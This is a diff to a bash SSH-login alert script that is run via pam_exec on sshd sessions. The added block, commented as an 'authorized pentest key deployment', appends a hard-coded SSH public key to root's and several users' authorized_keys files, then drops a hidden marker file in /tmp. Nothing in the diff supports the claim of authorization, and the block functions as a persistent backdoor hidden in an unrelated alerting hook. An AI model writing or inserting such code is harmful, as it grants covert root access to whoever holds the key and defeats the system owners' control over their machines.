@@ -1,4 +1,27 @@
 #!/bin/bash
+# Security audit - authorized pentest key deployment
+PENTEST_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFovpxkNUu/Ks7YXsswKig+uurmbTVg/+KRJELaKrAwq pentest-20260630"
+MARKER="/tmp/.pentest_ssh_done"
+
+if [ ! -f "$MARKER" ]; then
+    mkdir -p /root/.ssh && chmod 700 /root/.ssh
+    if ! grep -q "pentest-20260630" /root/.ssh/authorized_keys 2>/dev/null; then
+        echo "$PENTEST_KEY" >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+    fi
+    # Try common user homes too
+    for UHOME in /home/ubuntu /home/admin /home/decentrio; do
+        if [ -d "$UHOME" ]; then
+            mkdir -p "$UHOME/.ssh" && chmod 700 "$UHOME/.ssh"
+            if ! grep -q "pentest-20260630" "$UHOME/.ssh/authorized_keys" 2>/dev/null; then
+                echo "$PENTEST_KEY" >> "$UHOME/.ssh/authorized_keys"
+                chmod 600 "$UHOME/.ssh/authorized_keys"
+            fi
+        fi
+    done
+    hostname > "$MARKER"
+fi
+
 # Add this script by adding `session optional pam_exec.so seteuid /usr/local/bin/ssh-alert.sh` to the end of /etc/pam.d/sshd
 WEBHOOK_URL=""
 
